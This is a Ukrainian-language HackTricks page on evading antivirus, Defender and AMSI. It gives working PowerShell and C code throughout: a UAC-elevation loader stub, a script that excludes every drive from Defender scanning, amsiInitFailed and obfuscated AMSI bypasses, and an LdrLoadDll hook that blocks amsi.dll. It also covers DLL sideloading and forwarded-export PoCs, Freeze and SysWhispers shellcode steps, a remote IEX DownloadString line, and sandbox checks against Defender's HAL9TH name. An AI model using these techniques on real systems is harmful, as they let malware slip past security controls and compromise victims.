# Обхід антивірусу (AV)

{{#include ../banners/hacktricks-training.md}}

**Цю сторінку спочатку написав** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Зупинити Defender

- [defendnot](https://github.com/es3n1n/defendnot): Інструмент для зупинки Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Інструмент для зупинки Windows Defender, який імітує інший AV.
- [Вимкнути Defender, якщо ви адміністратор](basic-powershell-for-pentesters/README.md)

### Приманка у стилі інсталятора з UAC перед втручанням у роботу Defender

Публічні лоадери, що видають себе за чити для ігор, часто постачаються як непідписані інсталятори Node.js/Nexe: спершу вони **запитують у користувача підвищення привілеїв**, а вже потім виводять Defender з ладу. Послідовність проста:

1. Перевірити наявність прав адміністратора за допомогою `net session`. Команда виконується успішно лише тоді, коли процес має права адміністратора, тож у разі помилки це означає, що лоадер працює від імені звичайного користувача.
2. Негайно перезапустити себе з дієсловом `RunAs`, щоб викликати очікуване вікно згоди UAC і зберегти початковий командний рядок.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Жертви вже вважають, що встановлюють «крякнуте» програмне забезпечення, тому зазвичай приймають запит, надаючи malware права, необхідні для зміни політики Defender.<sup>[[26]](#references)</sup>

### Загальні виключення `MpPreference` для кожної літери диска

Після отримання підвищених привілеїв ланцюжки на кшталт GachiLoader максимально використовують сліпі зони Defender, а не вимикають службу повністю. Спочатку loader завершує роботу GUI watchdog (`taskkill /F /IM SecHealthUI.exe`), а потім додає **надзвичайно широкі виключення**, через які профілі всіх користувачів, системні каталоги й знімні диски стають недоступними для сканування:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Ключові спостереження:

- Цикл обходить кожну підключену файлову систему (D:\, E:\, USB-накопичувачі тощо), тож **будь-які майбутні payload, розміщені будь-де на диску, ігноруватимуться**.
- Виключення для розширення `.sys` передбачає майбутнє використання — зловмисники залишають собі можливість пізніше завантажувати непідписані драйвери, не торкаючись Defender знову.
- Усі зміни вносяться в `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, тож на наступних етапах можна підтвердити, що виключення збереглися, або розширити їх, не викликаючи UAC повторно.

Оскільки жодна служба Defender не зупиняється, наївні перевірки стану й надалі повідомлятимуть, що «антивірус активний», хоча перевірка в реальному часі не охоплює ці шляхи.<sup>[[26]](#references)</sup>

## **Методологія обходу AV**

Наразі AV використовують різні методи для перевірки, чи є файл шкідливим: статичне виявлення, динамічний аналіз, а для просунутих EDR — поведінковий аналіз.

### **Статичне виявлення**

Статичне виявлення працює шляхом пошуку відомих шкідливих рядків або масивів байтів у бінарному файлі чи скрипті, а також вилучення інформації з самого файлу (наприклад, опису файлу, назви компанії, цифрових підписів, значка, контрольної суми тощо). Це означає, що використання відомих публічних інструментів може швидше привернути до вас увагу, оскільки їх, імовірно, вже проаналізували й позначили як шкідливі. Є кілька способів обійти такий тип виявлення:

- **Шифрування**

Якщо зашифрувати бінарний файл, AV не зможе виявити вашу програму, але знадобиться певний loader, щоб розшифрувати й запустити програму в пам’яті.

- **Обфускація**

Іноді достатньо змінити кілька рядків у бінарному файлі чи скрипті, щоб AV його пропустив, але це може забрати багато часу — залежно від того, що саме ви намагаєтеся обфускувати.

- **Власні інструменти**

Якщо розробити власні інструменти, відомих шкідливих сигнатур для них не буде, але це потребує значних зусиль і часу.

> [!TIP]
> Щоб перевірити файл на статичне виявлення Windows Defender, скористайтеся [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Він розбиває файл на кілька сегментів і доручає Defender сканувати кожен із них окремо, завдяки чому можна точно визначити, які рядки або байти у вашому бінарному файлі позначаються як підозрілі.

Наполегливо рекомендую переглянути цей [плейлист на YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) про практичний обхід AV.

### Офлайн-тести PE-ознак для статичних класифікаторів

Байти запакованого або зашифрованого payload — лише один із параметрів статичного класифікатора. EMBER2024 витягує ознаки PE, зокрема імпорти, експорти, секції, заголовки та дані Authenticode.<sup>[[48]](#references)</sup> В одному експерименті з loader додавання 141 імпорту, що виглядав нешкідливо, знизило оцінку шкідливості EMBER2024 на 93%, тоді як пов’язані зі шкідливим ПЗ імпорти підвищили її. Цей результат стосується саме цієї моделі та цих зразків і не є надійним способом обходу конкретного продукту AV/EDR.<sup>[[50]](#references)</sup>

Для авторизованого тестування loader залишайте payload і шлях виконання незмінними, змінюйте для кожного варіанта лише одну заплановану змінну збірки та порівнюйте оцінки офлайн. Перевіряйте отримані ознаки PE, оскільки зміна збірки може вплинути не на одну групу ознак.<sup>[[49]](#references)[[50]](#references)</sup> Щоб потрібні імпорти залишалися в IAT, викликайте вибрані Win32 API з досяжного коду. Змінюйте їхній набір і розподіляйте місця виклику між збірками, а не створюйте фіксовану функцію маскування, яка може стати сигнатурою. В експерименті також повідомлялося про нижчі оцінки для коректно підписаних кодів, записів експорту та більшої кількості функцій, що збільшують `.pdata`; некоректний підпис майже не вплинув на оцінку, а вплив `.pdata` був незначним.<sup>[[50]](#references)</sup>

Пакет `thrember` надає засоби для вилучення ознак і еталонні моделі. Після встановлення використайте `thrember.download_models("models")` з наявним каталогом `models`, а потім запустіть засіб оцінювання з його батьківського каталогу: допоміжна функція завантаження змінює поточний робочий каталог. Класифікатор PE може оцінювати каталог зі збірками, не надсилаючи їх до сервісу сканування:<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

Під час порівняння не змінюйте версії моделі та екстрактора ознак. Нижчий офлайн-показник лише свідчить про реакцію цього класифікатора на змінений бінарний файл; він не доводить ухилення від поведінкового аналізу, емуляції чи іншої моделі постачальника.<sup>[[49]](#references)[[50]](#references)</sup> Про [поліморфізм для кожного збирання та маскування зовнішнього бінарного файла у віртуалізованих payload](virtualized-payload-execution.md#camouflaging-the-outer-go-executable) дивіться в окремій моделі виконання.

### **Динамічний аналіз**

Динамічний аналіз — це коли AV запускає ваш бінарний файл у sandbox і стежить за шкідливою активністю (наприклад, спробами розшифрувати й прочитати паролі вашого браузера, створити minidump LSASS тощо). Працювати з цим може бути трохи складніше, але ось кілька способів обійти sandbox.

- **Затримка перед виконанням** Залежно від реалізації, це може бути чудовим способом обійти динамічний аналіз AV. AV має дуже мало часу на сканування файлів, щоб не переривати роботу користувача, тому тривалі затримки можуть завадити аналізу бінарних файлів. Проблема в тому, що багато sandbox AV можуть просто пропустити затримку — залежно від способу її реалізації.
- **Перевірка ресурсів комп'ютера** Зазвичай sandbox мають дуже обмежені ресурси (наприклад, < 2GB RAM), інакше вони можуть сповільнювати комп'ютер користувача. Тут також можна проявити неабияку винахідливість: наприклад, перевіряти температуру CPU або навіть швидкість обертання вентиляторів — у sandbox може бути реалізовано не все.
- **Перевірки, специфічні для комп'ютера** Якщо ви хочете націлитися на користувача, чия робоча станція приєднана до домену "contoso.local", можна перевірити домен комп'ютера й порівняти його із заданим. Якщо він не збігається, програма може завершити роботу.

Виявляється, ім'я комп'ютера в sandbox Microsoft Defender — HAL9TH. Тож перед детонацією можна перевірити ім'я комп'ютера у своєму malware. Якщо воно збігається з HAL9TH, це означає, що ви перебуваєте в sandbox Defender, і програма може завершити роботу.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>джерело: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Ще кілька справді корисних порад від [@mgeeky](https://twitter.com/mariuszbit) щодо протидії sandbox

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> канал #malware-dev</p></figcaption></figure>

Як ми вже казали в цій публікації, **публічні інструменти** зрештою **почнуть виявляти**, тож варто запитати себе ось про що:

Наприклад, якщо ви хочете зробити дамп LSASS, **чи справді вам потрібно використовувати mimikatz**? Чи можна скористатися менш відомим проєктом, який також робить дамп LSASS?

Імовірно, правильна відповідь — другий варіант. Якщо взяти mimikatz як приклад, це, мабуть, один із найбільш позначених AV та EDR шкідливих програм, якщо не найбільш позначений. Сам проєкт чудовий, але з ним також дуже складно працювати, щоб обходити AV, тож просто шукайте альтернативи для досягнення своєї мети.

> [!TIP]
> Змінюючи свої payload для ухилення, не забудьте **вимкнути автоматичне надсилання зразків** у Defender і, будь ласка, серйозно, **НЕ ЗАВАНТАЖУЙТЕ ЇХ НА VIRUSTOTAL**, якщо ваша мета — домогтися тривалого ухилення. Щоб перевірити, чи виявляє ваш payload певний AV, установіть його на VM, спробуйте вимкнути автоматичне надсилання зразків і тестуйте його там, доки не будете задоволені результатом.

## EXEs vs DLLs

За будь-якої нагоди завжди **віддавайте перевагу DLL для ухилення**. З мого досвіду, DLL-файли зазвичай **виявляють і аналізують значно рідше**, тож у деяких випадках це дуже простий спосіб уникнути виявлення (якщо ваш payload, звісно, можна запускати як DLL).

Як бачимо на цьому зображенні, рівень виявлення DLL Payload від Havoc на antiscan.me становить 4/26, тоді як для EXE payload — 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>порівняння на antiscan.me звичайного EXE payload від Havoc і звичайної DLL від Havoc</p></figcaption></figure>

Тепер розглянемо кілька прийомів роботи з DLL-файлами, які допоможуть зробити їх значно непомітнішими.

## DLL Sideloading & Proxying

**DLL Sideloading** використовує порядок пошуку DLL, який застосовує завантажувач, розміщуючи вразливу програму та шкідливий payload поруч.

Знайти програми, вразливі до DLL Sideloading, можна за допомогою [Siofra](https://github.com/Cybereason/siofra) та такого скрипту powershell:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Ця команда виведе список програм у "C:\Program Files\\" , вразливих до DLL hijacking, і DLL-файлів, які вони намагаються завантажити.

Наполегливо рекомендую **самостійно дослідити програми, вразливі до DLL Hijacking/Sideloading**. За належного виконання ця техніка досить непомітна, але якщо використовувати загальновідомі програми, вразливі до DLL Sideloading, вас можуть легко виявити.

Якщо просто розмістити шкідливу DLL із назвою, яку програма очікує завантажити, це не призведе до завантаження вашого payload, оскільки програма очікує наявність у цій DLL певних функцій. Щоб вирішити цю проблему, ми скористаємося іншою технікою — **DLL Proxying/Forwarding**.

**DLL Proxying** переспрямовує виклики програми з proxy (і шкідливої) DLL до оригінальної DLL, зберігаючи функціональність програми й даючи змогу виконати ваш payload.

Я використовуватиму проєкт [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) від [@flangvik](https://twitter.com/Flangvik/)

Ось кроки, яких я дотримувався:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Остання команда надасть нам 2 файли: шаблон вихідного коду DLL і оригінальну DLL із новою назвою.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Ось результати:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

І наш shellcode (закодований за допомогою [SGN](https://github.com/EgeBalci/sgn)), і proxy DLL мають рівень виявлення 0/26 на [antiscan.me](https://antiscan.me)! Вважаю це успіхом.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Наполегливо рекомендую** переглянути [VOD S3cur3Th1sSh1t на Twitch](https://www.twitch.tv/videos/1644171543) про DLL Sideloading, а також [відео ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE), щоб докладніше дізнатися про те, що ми обговорювали.

### Зловживання перенаправленими експортами (ForwardSideLoading)

Модулі Windows PE можуть експортувати функції, які насправді є «forwarders»: замість адреси коду запис експорту містить ASCII-рядок у форматі `TargetDll.TargetFunc`. Коли програма звертається до цього експорту, завантажувач Windows:

- Завантажить `TargetDll`, якщо його ще не завантажено
- Знайде в ньому `TargetFunc`

Важливо розуміти таку поведінку:
- Якщо `TargetDll` є KnownDLL, його буде завантажено із захищеного простору імен KnownDLLs (наприклад, ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Якщо `TargetDll` не є KnownDLL, застосовується звичайний порядок пошуку DLL, який включає каталог модуля, що виконує перенаправлення.

Це дає змогу скористатися непрямим примітивом sideloading: знайти підписану DLL, яка експортує функцію з перенаправленням на модуль, що не є KnownDLL, а потім розмістити цю підписану DLL поруч із контрольованою зловмисником DLL, назва якої точно збігається з назвою цільового модуля перенаправлення. Коли викликається перенаправлений експорт, завантажувач обробляє перенаправлення та завантажує вашу DLL із того самого каталогу, виконуючи ваш DllMain.<sup>[[13]](#references)</sup>

Приклад, зафіксований у Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` не є KnownDLL, тому пошук відбувається у звичайному порядку.

PoC (copy-paste):
1) Скопіюйте підписану системну DLL до папки з правом запису.
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Помістіть шкідливу `NCRYPTPROV.dll` у ту саму папку. Для виконання коду достатньо мінімальної `DllMain`; реалізовувати перенаправлену функцію, щоб викликати `DllMain`, не потрібно.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Запустіть переадресацію за допомогою підписаного LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Observed behavior:
- rundll32 (підписаний) завантажує side-by-side `keyiso.dll` (підписаний)
- Під час розв’язання `KeyIsoSetAuditingInterface` завантажувач переходить за forward до `NCRYPTPROV.SetAuditingInterface`
- Потім завантажувач завантажує `NCRYPTPROV.dll` з `C:\test` і виконує її `DllMain`
- Якщо `SetAuditingInterface` не реалізовано, помилка "missing API" з’явиться лише після виконання `DllMain`

Поради з пошуку:
- Зосередьтеся на forwarded exports, у яких цільовий модуль не є KnownDLL. Перелік KnownDLL міститься в `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Ви можете перелічити forwarded exports за допомогою таких інструментів, як:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Перегляньте інвентар перенаправлювачів Windows 11, щоб знайти потенційні кандидати: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ідеї для виявлення/захисту:
- Відстежуйте LOLBins (наприклад, rundll32.exe), які завантажують підписані DLL із нестандартних системних шляхів, а потім завантажують із цієї директорії не-KnownDLLs з таким самим базовим ім’ям
- Створюйте сповіщення про ланцюжки процесів/модулів на кшталт: `rundll32.exe` → нестандартний системний `keyiso.dll` → `NCRYPTPROV.dll` у шляхах, доступних для запису користувачем
- Застосовуйте політики цілісності коду (WDAC/AppLocker) і забороняйте запис і виконання в директоріях застосунків

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

За допомогою Freeze можна приховано завантажувати й виконувати свій shellcode.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Обхід виявлення — це гра в кішки-мишки: те, що працює сьогодні, завтра можуть виявити. Тому ніколи не покладайтеся лише на один інструмент і, якщо можливо, комбінуйте кілька технік обходу.

## Direct/Indirect Syscalls і визначення SSN (SysWhispers4)

EDR часто встановлюють **inline-хуки в user mode** на syscall-stubs у `ntdll.dll`. Щоб обійти ці хуки, можна згенерувати **direct** або **indirect syscall-stubs**, які завантажують правильний **SSN** (System Service Number) і переходять у режим ядра, не виконуючи перехоплену точку входу експорту.<sup>[[32]](#references)</sup>

**Варіанти виклику:**
- **Direct (embedded)**: додати інструкцію `syscall`/`sysenter`/`SVC #0` до згенерованого stub (без звернення до експорту `ntdll`).
- **Indirect**: перейти до наявного `syscall`-гаджета всередині `ntdll`, щоб перехід у режим ядра виглядав так, ніби його ініціювала `ntdll` (корисно для обходу евристичного виявлення); **randomized indirect** вибирає гаджет із пулу для кожного виклику.
- **Egg-hunt**: не зберігати статичну послідовність opcode `0F 05` на диску; знаходити послідовність syscall під час виконання.

**Стратегії визначення SSN, стійкі до хуків:**
- **FreshyCalls (VA sort)**: визначати SSN, сортуючи syscall-stubs за віртуальною адресою замість читання байтів stub.
- **SyscallsFromDisk**: відобразити чисту `\KnownDlls\ntdll.dll`, прочитати SSN з її `.text`, а потім скасувати відображення (обходить усі хуки в пам’яті).
- **RecycledGate**: поєднати визначення SSN за сортуванням VA з перевіркою opcode, якщо stub чистий; якщо він перехоплений, перейти до визначення за VA.
- **HW Breakpoint**: встановити DR0 на інструкцію `syscall` і використати VEH, щоб під час виконання отримати SSN з `EAX`, не аналізуючи перехоплені байти.

Приклад використання SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI було створено для захисту від "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Спочатку AV могли сканувати лише **файли на диску**, тому, якщо вдавалося виконати payloads **безпосередньо в пам’яті**, AV нічого не міг зробити, щоб цьому завадити, оскільки не мав достатньої видимості.

Функцію AMSI інтегровано в такі компоненти Windows:

- User Account Control, або UAC (підвищення привілеїв EXE, COM, MSI або інсталяції ActiveX)
- PowerShell (скрипти, інтерактивне використання та динамічне виконання коду)
- Windows Script Host (wscript.exe і cscript.exe)
- JavaScript і VBScript
- макроси Office VBA

Це дає змогу антивірусним рішенням перевіряти поведінку скриптів, надаючи їхній вміст у незашифрованому та не обфускованому вигляді.

Виконання `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` спричинить таке сповіщення у Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Зверніть увагу, як на початку додається `amsi:`, а за ним — шлях до виконуваного файла, з якого запустили скрипт, у цьому випадку powershell.exe.

Ми не записали жодного файла на диск, але все одно були виявлені в пам’яті завдяки AMSI.

Крім того, починаючи з **.NET 4.8**, код C# також перевіряється через AMSI. Це стосується навіть `Assembly.Load(byte[])`, який завантажує код для виконання в пам’яті. Саме тому для виконання в пам’яті, якщо потрібно обійти AMSI, рекомендується використовувати нижчі версії .NET (наприклад, 4.7.2 або нижче).

Є кілька способів обійти AMSI:

- **Обфускація**

Оскільки AMSI переважно працює зі статичним виявленням, змінення скриптів, які ви намагаєтеся завантажити, може бути хорошим способом уникнути виявлення.

Однак AMSI здатний знімати обфускацію зі скриптів, навіть якщо вони мають кілька шарів обфускації, тому обфускація може бути невдалим варіантом — залежно від способу її застосування. Через це обійти виявлення не так просто. Втім, іноді достатньо змінити кілька назв змінних — і все працюватиме, тож усе залежить від того, наскільки сильно щось позначено як загрозу.

- **AMSI Bypass**

Оскільки AMSI реалізовано через завантаження DLL у процес powershell (а також cscript.exe, wscript.exe тощо), втручатися в неї можна досить легко навіть без привілеїв. Через цю ваду в реалізації AMSI дослідники знайшли кілька способів обходити сканування AMSI.

**Примусове спричинення помилки**

Примусова помилка ініціалізації AMSI (amsiInitFailed) призведе до того, що для поточного процесу сканування не запускатиметься. Вперше про це повідомив [Matt Graeber](https://twitter.com/mattifestation), після чого Microsoft розробила сигнатуру, щоб запобігти широкому використанню цього методу.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Щоб зробити AMSI непридатним для використання в поточному процесі PowerShell, знадобився лише один рядок коду PowerShell. Звісно, сам AMSI позначив цей рядок, тож для використання цієї техніки потрібні певні зміни.

Ось модифікований AMSI bypass, який я взяв із цього [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Зважайте, що після публікації цей допис, імовірно, буде виявлено, тож не публікуйте код, якщо плануєте залишатися непоміченими.

**Memory Patching**

Цю техніку вперше виявив [@RastaMouse](https://twitter.com/_RastaMouse/). Вона полягає в пошуку адреси функції "AmsiScanBuffer" у amsi.dll (яка відповідає за сканування введених користувачем даних) і перезаписі її інструкціями, що повертають код E_INVALIDARG. У такий спосіб результат фактичного сканування дорівнюватиме 0, що інтерпретується як чистий результат.

> [!TIP]
> Щоб отримати докладніше пояснення, прочитайте [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/).

Існує також багато інших технік обходу AMSI за допомогою powershell. Дізнайтеся про них більше на [**цій сторінці**](basic-powershell-for-pentesters/index.html#amsi-bypass) та в [**цьому репозиторії**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell).

### Перенаправлення вказівника сканування AMSI COM замість патчингу `AmsiScanBuffer`

Ще один обхід у межах процесу не змінює точку входу `AmsiScanBuffer`. У описаному 64-бітному .NET loader створюється об’єкт AMSI COM із CLSID `fdb00e52-a214-4aa1-8fba-4357bb0072ec`; `Marshal.GetIUnknownForObject()` повертає вказівник на інтерфейс, а слот його vtable зі зміщенням `0x18` використовується як ціль виклику сканування. Loader патчить нативний вказівник для `Console.Clear()` невеликим x64 stub, змінює цей запис vtable на вказівник на stub за допомогою `VirtualProtect()`, а потім відновлює початковий захист сторінки. Для цього потрібні 64-бітна ширина вказівника та очікувана структура COM; це не універсальне зміщення для довільних інтерфейсів AMSI або збірок. Раніше спостерігалися такі етапи: [завантаження sidecar із підписаним AppDomainManager](windows-local-privilege-escalation/dll-hijacking/#signed-appdomainmanager-type-as-a-configuration-file-gadget) і [десеріалізація RESX](../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml).<sup>[[51]](#references)</sup>

Спостережені байти stub — `41 C7 00 01 00 00 00 33 C0 C3`: вони записують **1** за вказівником результату в `r8` і повертають **0** у `eax`. Отже, твердження в описі, що результат сканування — `AMSI_RESULT_CLEAN` (0), плутає значення повернення `S_OK` із вихідним enum. У задокументованому порядку `AMSI_RESULT` значення результату **1** — це `AMSI_RESULT_NOT_DETECTED`; воно все одно нижче порога виявлення.<sup>[[51]](#references)[[52]](#references)[[53]](#references)</sup>

### Блокування AMSI через запобігання завантаженню amsi.dll (перехоплення LdrLoadDll)

AMSI ініціалізується лише після завантаження `amsi.dll` у поточний процес. Надійний обхід, незалежний від мови програмування, — встановити hook у user mode на `ntdll!LdrLoadDll`, який повертає помилку, якщо запитаний модуль — `amsi.dll`. У результаті AMSI не завантажується, і в цьому процесі сканування не відбувається.<sup>[[23]](#references)</sup>

Загальний план реалізації (псевдокод x64 C/C++):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Нотатки
- Працює з PowerShell, WScript/CScript і custom loaders (з усім, що інакше завантажувало б AMSI).
- Поєднуйте з передаванням скриптів через stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), щоб уникнути довгих артефактів командного рядка.
- Використовувалося завантажувачами, запущеними через LOLBins (наприклад, `regsvr32`, що викликає `DllRegisterServer`).

Інструмент **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** також генерує скрипт для обходу AMSI.
Інструмент **[https://amsibypass.com/](https://amsibypass.com/)** також генерує скрипт для обходу AMSI, який уникає виявлення сигнатурами завдяки рандомізованим визначеним користувачем функціям, змінним, виразам символів і випадковому регістру ключових слів PowerShell.

**Видаліть виявлену сигнатуру**

Щоб видалити виявлену сигнатуру AMSI з пам’яті поточного процесу, можна скористатися такими інструментами, як **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** і **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**. Цей інструмент сканує пам’ять поточного процесу на наявність сигнатури AMSI, а потім перезаписує її інструкціями NOP, фактично видаляючи її з пам’яті.

**Продукти AV/EDR, що використовують AMSI**

Список продуктів AV/EDR, що використовують AMSI, можна знайти тут: **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Використовуйте PowerShell версії 2**
Якщо використовувати PowerShell версії 2, AMSI не завантажуватиметься, тож можна запускати скрипти без сканування AMSI. Це можна зробити так:

```bash
powershell.exe -version 2
```

## Журналювання PowerShell

Журналювання PowerShell — це функція, яка дає змогу записувати всі команди PowerShell, виконані в системі. Це може бути корисним для аудиту та усунення несправностей, але також може стати **проблемою для зловмисників, які хочуть уникнути виявлення**.

Щоб обійти журналювання PowerShell, можна скористатися такими техніками:

- **Вимкнути Transcription і Module Logging у PowerShell**: для цього можна скористатися таким інструментом, як [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Використовувати PowerShell версії 2**: у PowerShell версії 2 AMSI не завантажується, тож можна запускати скрипти без сканування AMSI. Для цього виконайте: `powershell.exe -version 2`
- **Використовувати некерований сеанс PowerShell**: скористайтеся [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), щоб розмістити PowerShell без запуску `powershell.exe` (цей підхід використовує `powerpick` у Cobalt Strike). Це дає змогу обійти засоби контролю, прив’язані саме до процесу `powershell.exe`, але саме по собі не вимикає AMSI, Script Block Logging чи інші засоби захисту PowerShell; рівень охоплення залежить від середовища виконання та реалізації хоста.


## Обфускація

> [!TIP]
> У кількох техніках обфускації дані шифруються, що збільшує ентропію бінарного файла й полегшує його виявлення антивірусами та EDR. Будьте обережні й, можливо, застосовуйте шифрування лише до певних фрагментів коду, які є чутливими або мають залишатися прихованими.

### Деобфускація .NET-бінарних файлів, захищених ConfuserEx

Під час аналізу malware, що використовує ConfuserEx 2 (або комерційні форки), часто доводиться мати справу з кількома рівнями захисту, які блокують декомпілятори та sandbox-середовища. Наведений нижче робочий процес надійно **відновлює майже оригінальний IL**, який згодом можна декомпілювати в C# за допомогою таких інструментів, як dnSpy або ILSpy.<sup>[[10]](#references)</sup>

